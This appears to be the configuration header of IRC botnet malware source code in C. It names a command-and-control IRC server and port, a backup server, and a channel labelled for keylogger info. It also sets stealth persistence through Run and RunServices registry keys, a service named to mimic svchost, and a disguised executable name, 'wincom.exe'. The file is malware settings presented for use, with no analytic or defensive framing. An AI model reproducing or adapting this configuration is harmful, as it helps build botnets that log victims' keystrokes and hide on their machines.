// bot configuration
//main
unsigned short bindport = 4460;
char botid[] = "null"; // bot id
char password[] = "test"; // bot password
const int maxlogins = 2; // maximum number of simultaneous logins

//main info
char server[] = "irc.bluehell.org"; // server
int port = 6667; // server port
char serverpass[] = ""; // server password
char channel[] = "##"; // channel that the bot should join
char chanpass[] = ""; // channel password
char exploitchan[] = "##";		// Keyloger Info Channel

//backup
char server2[] = ""; // backup server (optional)
int port2 = 44444; // backup server port
char channel2[] = ""; // backup channel (optional)
char chanpass2[] = ""; // backup channel password (optional)

//file
BOOL topiccmd = TRUE; // set to TRUE to enable topic commands
BOOL rndfilename = FALSE; // use random file name
char filename[] = "wincom.exe"; // destination file name

//autostarts
//registry
BOOL regrun = TRUE; // use the Run registry key for autostart
BOOL regrunservices = TRUE; // use the RunServices registry key for autostart
BOOL AutoStart = TRUE; 
char valuename[] = "Dcom Helper"; // value name for autostart
const bool useservice = TRUE;
const char *servicename = "svchost32";

//other
char prefix = '.'; // command prefix (one character max.)
const int maxaliases = 16; // maximum number of aliases (must be greater than the  number of predefined aliases).
char *authost[] = {"*@*", "\0"}; // wildcard works
char bversion[] = "(.null.): [Version 2.1.2]"; // Bots !version reply
char version[] = "";
char *versionlist[] = {
			"m",
			};

BOOL constnick = TRUE; //If False Then Use OS Nicks
char nickconst[] = "[null]"; // first part to the bot's nick
const int maxrand = 6; // how many random numbers in the nick